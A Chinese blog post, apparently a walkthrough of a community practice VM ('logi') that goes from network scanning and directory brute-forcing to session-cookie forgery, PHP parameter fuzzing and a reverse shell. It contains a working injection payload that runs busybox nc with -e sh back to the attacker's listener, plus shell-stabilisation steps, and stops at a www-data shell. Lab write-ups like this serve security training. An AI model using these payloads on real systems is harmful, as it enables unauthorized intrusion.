@@ -1,0 +1,324 @@
+<!doctype html><html lang=zh-cn><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>群友靶机logi - Twansh's blog</title><link rel=icon href=/logo.png><script>(function(){localStorage.removeItem("flavor-theme");var t=window.matchMedia("(prefers-color-scheme: dark)"),e=sessionStorage.getItem("flavor-theme-override");if(e==="light"||e==="dark"){document.documentElement.setAttribute("data-theme",e);return}document.documentElement.setAttribute("data-theme",t.matches?"dark":"light")})()</script><link rel=preload as=font type=font/woff2 href=/fonts/tsanger-jinkai02/20307ec77575b65807a8b0c5b7201f43.woff2 crossorigin><link rel=preload as=style href=/fonts/tsanger-jinkai02/result.css onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/fonts/tsanger-jinkai02/result.css></noscript><link rel=stylesheet href=/scss/main.min.f9483bf4231821718c79757993df7674f414a796ac0bd206f89cc6c81e39cb27.css><meta name=description content="VM靶机的有趣程度不在春秋云镜这样子的靶场之下，通过这个交流群，我才发现我掌握的知识不过是冰山一角，仍然还需要大量且持久的学习"><meta name=author content="Twansh"><meta name=robots content="index,follow,max-image-preview:large"><meta name=keywords content="Cyberspace Security,CTF,Web Security,Penetration Testing,Offensive,靶机"><link rel=canonical href=https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAlogi/><meta property="og:site_name" content="Twansh's blog"><meta property="og:title" content="群友靶机logi - Twansh's blog"><meta property="og:description" content="VM靶机的有趣程度不在春秋云镜这样子的靶场之下，通过这个交流群，我才发现我掌握的知识不过是冰山一角，仍然还需要大量且持久的学习"><meta property="og:type" content="article"><meta property="og:url" content="https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAlogi/"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://3a0.top/logo.png"><meta property="og:image:alt" content="群友靶机logi"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="群友靶机logi - Twansh's blog"><meta name=twitter:description content="VM靶机的有趣程度不在春秋云镜这样子的靶场之下，通过这个交流群，我才发现我掌握的知识不过是冰山一角，仍然还需要大量且持久的学习"><meta name=twitter:image content="https://3a0.top/logo.png"><meta property="article:published_time" content="2025-10-02T11:17:23Z"><meta property="article:modified_time" content="2025-10-02T11:17:23Z"><meta property="article:section" content="Offensive"><meta property="article:tag" content="靶机"><script type=application/ld+json>{"@context":"https://schema.org","@graph":[{"@id":"https://3a0.top/#website","@type":"WebSite","description":"Cyberspace Security / CTF / Web 安全，记录学习和生活。","inLanguage":"zh-cn","name":"Twansh's blog","url":"https://3a0.top/"},{"@id":"https://3a0.top/about/#author","@type":"Person","email":"eminemgcxwlp@gmail.com","name":"Twansh","sameAs":["https://github.com/GCXWLP"],"url":"https://3a0.top/about/"},{"@id":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAlogi/#article","@type":"BlogPosting","author":{"@id":"https://3a0.top/about/#author"},"dateModified":"2025-10-02T11:17:23Z","datePublished":"2025-10-02T11:17:23Z","description":"VM靶机的有趣程度不在春秋云镜这样子的靶场之下，通过这个交流群，我才发现我掌握的知识不过是冰山一角，仍然还需要大量且持久的学习","headline":"群友靶机logi","image":["https://3a0.top/logo.png"],"inLanguage":"zh-cn","isPartOf":{"@id":"https://3a0.top/#website"},"keywords":["Offensive","靶机"],"mainEntityOfPage":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAlogi/","url":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAlogi/"},{"@id":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAlogi/#breadcrumb","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://3a0.top/","name":"Home","position":1},{"@type":"ListItem","item":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAlogi/","name":"群友靶机logi","position":2}]}]}</script></head><body><nav class=navbar id=navbar><div class=navbar__inner><a class=navbar__brand href=/><span>Twansh's blog</span></a><div class=navbar__right><ul class=navbar__links id=nav-links><li><a href=/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<span>Links</span></a></li><li><a href=/travel/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
+<span>Travel</span></a></li></ul><button class=navbar__btn id=search-btn type=button aria-label=Search>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+</button>
+<button class=navbar__btn id=theme-toggle type=button aria-label="Toggle theme">
+<svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+<svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+</button>
+<button class="navbar__btn navbar__hamburger" id=hamburger type=button aria-label=Menu>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></nav><div class=site-content><div class=post-layout><article class="post-layout__content post-single"><header class=post-single__header><div class=post-single__meta><time datetime=2025-10-02 data-pagefind-meta=date[datetime]>Oct 02, 2025</time>
+<span class=sep>·</span>
+<span>5 min read</span>
+<span class=sep>·</span>
+<span>1048 words</span>
+<span class=sep>·</span>
+<a href=/categories/offensive/ class=post-single__category data-pagefind-filter=category>Offensive</a></div><h1 class=post-single__title data-pagefind-meta=title>群友靶机logi</h1></header><div class=article-content data-pagefind-body><p>配置好之后，我们的kali应该是和目标靶机处于同一个网段，直接ifconfig</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# ifconfig
+</span></span><span class=line><span class=cl>eth0: <span class=nv>flags</span><span class=o>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class=m>1500</span>
+</span></span><span class=line><span class=cl>        inet 192.168.56.102  netmask 255.255.255.0  broadcast 192.168.56.255
+</span></span><span class=line><span class=cl>        inet6 fe80::20c:29ff:fe66:2ae1  prefixlen <span class=m>64</span>  scopeid 0x20&lt;link&gt;
+</span></span><span class=line><span class=cl>        ether 00:0c:29:66:2a:e1  txqueuelen <span class=m>1000</span>  <span class=o>(</span>Ethernet<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX packets <span class=m>1</span>  bytes <span class=m>590</span> <span class=o>(</span>590.0 B<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX errors <span class=m>0</span>  dropped <span class=m>0</span>  overruns <span class=m>0</span>  frame <span class=m>0</span>
+</span></span><span class=line><span class=cl>        TX packets <span class=m>23</span>  bytes <span class=m>3062</span> <span class=o>(</span>2.9 KiB<span class=o>)</span>
+</span></span><span class=line><span class=cl>        TX errors <span class=m>0</span>  dropped <span class=m>0</span> overruns <span class=m>0</span>  carrier <span class=m>0</span>  collisions <span class=m>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>lo: <span class=nv>flags</span><span class=o>=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class=m>65536</span>
+</span></span><span class=line><span class=cl>        inet 127.0.0.1  netmask 255.0.0.0
+</span></span><span class=line><span class=cl>        inet6 ::1  prefixlen <span class=m>128</span>  scopeid 0x10&lt;host&gt;
+</span></span><span class=line><span class=cl>        loop  txqueuelen <span class=m>1000</span>  <span class=o>(</span>Local Loopback<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX packets <span class=m>168</span>  bytes <span class=m>13440</span> <span class=o>(</span>13.1 KiB<span class=o>)</span>
+</span></span><span class=line><span class=cl>        RX errors <span class=m>0</span>  dropped <span class=m>0</span>  overruns <span class=m>0</span>  frame <span class=m>0</span>
+</span></span><span class=line><span class=cl>        TX packets <span class=m>168</span>  bytes <span class=m>13440</span> <span class=o>(</span>13.1 KiB<span class=o>)</span>
+</span></span><span class=line><span class=cl>        TX errors <span class=m>0</span>  dropped <span class=m>0</span> overruns <span class=m>0</span>  carrier <span class=m>0</span>  collisions <span class=m>0</span>
+</span></span></code></pre></div><p>然后利用arp-scan来进行信息收集</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# arp-scan -l
+</span></span><span class=line><span class=cl>Interface: eth0, type: EN10MB, MAC: 00:0c:29:66:2a:e1, IPv4: 192.168.56.102
+</span></span><span class=line><span class=cl>Starting arp-scan 1.10.0 with <span class=m>256</span> hosts <span class=o>(</span>https://github.com/royhills/arp-scan<span class=o>)</span>
+</span></span><span class=line><span class=cl>192.168.56.1    0a:00:27:00:00:0d       <span class=o>(</span>Unknown: locally administered<span class=o>)</span>
+</span></span><span class=line><span class=cl>192.168.56.100  08:00:27:f7:c4:82       PCS Systemtechnik GmbH
+</span></span><span class=line><span class=cl>192.168.56.103  08:00:27:42:80:35       PCS Systemtechnik GmbH
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>3</span> packets received by filter, <span class=m>0</span> packets dropped by kernel
+</span></span><span class=line><span class=cl>Ending arp-scan 1.10.0: <span class=m>256</span> hosts scanned in 1.938 seconds <span class=o>(</span>132.09 hosts/sec<span class=o>)</span>. <span class=m>3</span> responded
+</span></span></code></pre></div><p>根据经验，我们知道192.168.56.103是我们的目标靶机</p><p>nmap找一下存活的端口</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# nmap -sC -sV -p- 192.168.56.103
+</span></span><span class=line><span class=cl>Starting Nmap 7.95 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2025-10-02 15:10 +08
+</span></span><span class=line><span class=cl>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.56.103
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00051s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65533</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 <span class=o>(</span>protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.62 <span class=o>((</span>Debian<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: TI15 AME<span class=se>\x</span>E5<span class=se>\x</span>8A<span class=se>\x</span>A9<span class=se>\x</span>E5<span class=se>\x</span>A8<span class=se>\x</span><span class=m>81</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.62 <span class=o>(</span>Debian<span class=o>)</span>
+</span></span><span class=line><span class=cl>MAC Address: 08:00:27:42:80:35 <span class=o>(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span class=o>)</span>
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 8.03 seconds
+</span></span></code></pre></div><p>firefox访问一手</p><p>发现是关于dota的，没玩过不太清楚，然后源码页给了一个信息</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!--ame:jiayouachunyu--&gt;</span>
+</span></span></code></pre></div><p>类似账号密码?尝试ssh连接，发现连接不上，那应该不是了</p><p>使用gobuster扫一下目录</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# gobuster dir -u http://192.168.56.103/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-*.txt
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.8
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://192.168.56.103/
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.8
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>/user                 <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2170<span class=o>]</span>
+</span></span><span class=line><span class=cl>/admin                <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1576<span class=o>]</span>
+</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 279<span class=o>]</span>
+</span></span><span class=line><span class=cl>Progress: <span class=m>220558</span> / <span class=m>220558</span> <span class=o>(</span>100.00%<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=nv>Finished</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span></code></pre></div><p>扫到了user和admin<br>user页面可以使用刚才提示的账号密码登录进去<br>admin界面也有提示</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl> <span class=c>&lt;!-- 迷惑表单：表面要用户名/密码/二次验证码，但这些字段并不用于实际认证 --&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>form</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;post&#34;</span> <span class=na>autocomplete</span><span class=o>=</span><span class=s>&#34;off&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>label</span><span class=p>&gt;</span>用户名<span class=p>&lt;/</span><span class=nt>label</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;username&#34;</span> <span class=na>placeholder</span><span class=o>=</span><span class=s>&#34;请输入用户名&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>label</span><span class=p>&gt;</span>密码<span class=p>&lt;/</span><span class=nt>label</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;password&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;password&#34;</span> <span class=na>placeholder</span><span class=o>=</span><span class=s>&#34;请输入密码&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>label</span><span class=p>&gt;</span>二次校验码（可选）<span class=p>&lt;/</span><span class=nt>label</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;otp&#34;</span> <span class=na>placeholder</span><span class=o>=</span><span class=s>&#34;XXXXXX&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c>&lt;!-- 供高级用户/工具直接提交 token（不会在界面显著提示） --&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>label</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;display:none&#34;</span><span class=p>&gt;</span>token（内部使用）<span class=p>&lt;/</span><span class=nt>label</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;token&#34;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;display:none&#34;</span> <span class=p>/&gt;</span>
+</span></span></code></pre></div><p>可以直接用cookie登录，这就是很经典的ctf中的session伪造,前面提到过的，nevergiveup在这里其实就是secret key，jwt解码之后改user为admin之后，用secretkey重新编为cookie即可，用burpsuite发包即可登录</p><p>admin页面给出了另外一个提示<br>让我们去访问karsakarsa369.php<br>firefox访问之后提示我们fuzz，按照打CTF的经验这里应该是fuzz一个get参数，使用ffuf爆破get参数<br>爆出来是cmd</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─#  ffuf -u <span class=s1>&#39;http://192.168.56.103/karsakarsa369.php?FUZZ=phpinfo();&#39;</span> -w /home/kali/桌面/1.txt --fs <span class=m>4</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        /<span class=s1>&#39;___\  /&#39;</span>___<span class=se>\ </span>          /<span class=err>&#39;</span>___<span class=se>\ </span>      
+</span></span><span class=line><span class=cl>       /<span class=se>\ \_</span>_/ /<span class=se>\ \_</span>_/  __  __  /<span class=se>\ \_</span>_/       
+</span></span><span class=line><span class=cl>       <span class=se>\ \ </span>,__<span class=se>\\</span> <span class=se>\ </span>,__<span class=se>\/\ \/\ \ \ \ </span>,__<span class=se>\ </span>     
+</span></span><span class=line><span class=cl>        <span class=se>\ \ \_</span>/ <span class=se>\ \ \_</span>/<span class=se>\ \ \_\ \ \ \ \_</span>/      
+</span></span><span class=line><span class=cl>         <span class=se>\ \_\ </span>  <span class=se>\ \_\ </span> <span class=se>\ \_</span>___/  <span class=se>\ \_\ </span>      
+</span></span><span class=line><span class=cl>          <span class=se>\/</span>_/    <span class=se>\/</span>_/   <span class=se>\/</span>___/    <span class=se>\/</span>_/       
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>       v2.1.0-dev
+</span></span><span class=line><span class=cl>________________________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> :: Method           : GET
+</span></span><span class=line><span class=cl> :: URL              : http://192.168.56.103/karsakarsa369.php?FUZZ<span class=o>=</span>phpinfo<span class=o>()</span><span class=p>;</span>
+</span></span><span class=line><span class=cl> :: Wordlist         : FUZZ: /home/kali/桌面/1.txt
+</span></span><span class=line><span class=cl> :: Follow redirects : <span class=nb>false</span>
+</span></span><span class=line><span class=cl> :: Calibration      : <span class=nb>false</span>
+</span></span><span class=line><span class=cl> :: Timeout          : <span class=m>10</span>
+</span></span><span class=line><span class=cl> :: Threads          : <span class=m>40</span>
+</span></span><span class=line><span class=cl> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span class=line><span class=cl> :: Filter           : Response size: <span class=m>4</span>
+</span></span><span class=line><span class=cl>________________________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>cmd                     <span class=o>[</span>Status: 200, Size: 86155, Words: 4281, Lines: 1024, Duration: 324ms<span class=o>]</span>
+</span></span><span class=line><span class=cl>:: Progress: <span class=o>[</span>5846/5846<span class=o>]</span> :: Job <span class=o>[</span>1/1<span class=o>]</span> :: <span class=m>1680</span> req/sec :: Duration: <span class=o>[</span>0:00:03<span class=o>]</span> :: Errors: <span class=m>0</span> ::
+</span></span></code></pre></div><p>接下来直接对这个参数的键值进行fuzz<br>使用这个字典<br><a href=https://github.com/TheKingOfDuck/fuzzDicts/tree/master/ctfDict>ctf常用字典</a><br>fuzz一下键值对，看看有什么可用的<br>需要注意的是，光用这个字典fuzz是fuzz不出来东西的，需要自己稍加修改才可以<br>fuzz出phpinfo();可以访问<br>按经验，依然大调查disable_functions</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>system,passthru,shell_exec,proc_open,pcntl_exec,dl
+</span></span></code></pre></div><p>发现这些被ban了<br>用exec进行反弹shell</p><p>firefox访问</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://192.168.56.103/karsakarsa369.php?cmd<span class=o>=</span>exec<span class=o>(</span>%27busybox%20nc%20192.168.56.102%207777%20-e%20sh%27<span class=o>)</span><span class=p>;</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# nc -lnvp <span class=m>7777</span>
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>7777</span> ...
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>192.168.56.102<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>192.168.56.103<span class=o>]</span> <span class=m>33902</span>
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>admin.php
+</span></span><span class=line><span class=cl>ameti15-2.jpg
+</span></span><span class=line><span class=cl>ameti15-3+.jpg
+</span></span><span class=line><span class=cl>ameti15-4.png
+</span></span><span class=line><span class=cl>ameti15.jpg
+</span></span><span class=line><span class=cl>index.html
+</span></span><span class=line><span class=cl>karsakarsa369.php
+</span></span><span class=line><span class=cl>user.php
+</span></span><span class=line><span class=cl>whoami
+</span></span><span class=line><span class=cl>www-data
+</span></span></code></pre></div><p>成功得到shell</p><p>但是这样子弹的shell不知道为什么无法稳定下来</p><p>所以还是用bash反弹</p><p>虽然可以成功通过稳定操作，但是这个shell有点抽象啊<br>升级为交互式shell的方法看这里<br><a href=https://www.jianshu.com/p/e7202cb2c3dd>稳定shell</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# nc -lnvp <span class=m>4444</span>
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>4444</span> ...
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>192.168.56.102<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>192.168.56.103<span class=o>]</span> <span class=m>50456</span>
+</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>397<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
+</span></span><span class=line><span class=cl>bash: no job control in this shell
+</span></span><span class=line><span class=cl>www-data@logi:/var/www/html$ ls
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>admin.php
+</span></span><span class=line><span class=cl>ameti15-2.jpg
+</span></span><span class=line><span class=cl>ameti15-3+.jpg
+</span></span><span class=line><span class=cl>ameti15-4.png
+</span></span><span class=line><span class=cl>ameti15.jpg
+</span></span><span class=line><span class=cl>index.html
+</span></span><span class=line><span class=cl>karsakarsa369.php
+</span></span><span class=line><span class=cl>user.php
+</span></span><span class=line><span class=cl>www-data@logi:/var/www/html$ ^Z  
+</span></span><span class=line><span class=cl>zsh: suspended  nc -lnvp <span class=m>4444</span>
+</span></span><span class=line><span class=cl>                                                                                                                                                                                   
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>  + continued  nc -lnvp <span class=m>4444</span>
+</span></span><span class=line><span class=cl>                               reset xterm
+</span></span><span class=line><span class=cl>                                          reset: terminal attributes: No such device or address
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                                                                                               www-data@logi:/var/www/html$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
+</span></span><span class=line><span class=cl>                                                                                                                                             www-data@logi:/var/www/html$ <span class=nb>export</span> <span class=nv>shell</span><span class=o>=</span>/bin/bash
+</span></span><span class=line><span class=cl>             www-data@logi:/var/www/html$ ls
+</span></span><span class=line><span class=cl>                                            admin.php
+</span></span><span class=line><span class=cl>                                                     ameti15-2.jpg
+</span></span><span class=line><span class=cl>                                                                  ameti15-3+.jpg
+</span></span><span class=line><span class=cl>                                                                                ameti15-4.png
+</span></span><span class=line><span class=cl>                                                                                             ameti15.jpg
+</span></span><span class=line><span class=cl>                                                                                                        index.html
+</span></span><span class=line><span class=cl>                                                                                                                  karsakarsa369.php
+</span></span><span class=line><span class=cl>                                                                                                                                   user.php
+</span></span><span class=line><span class=cl>                                                                                                                                           www-data@logi:/var/www/html$ 
+</span></span><span class=line><span class=cl>                                                                                                                                                                        www-data@logi:/var/www/html$ 
+</span></span><span class=line><span class=cl>                  www-data@logi:/var/www/html$ 
+</span></span><span class=line><span class=cl>                                               www-data@logi:/var/www/html$ 
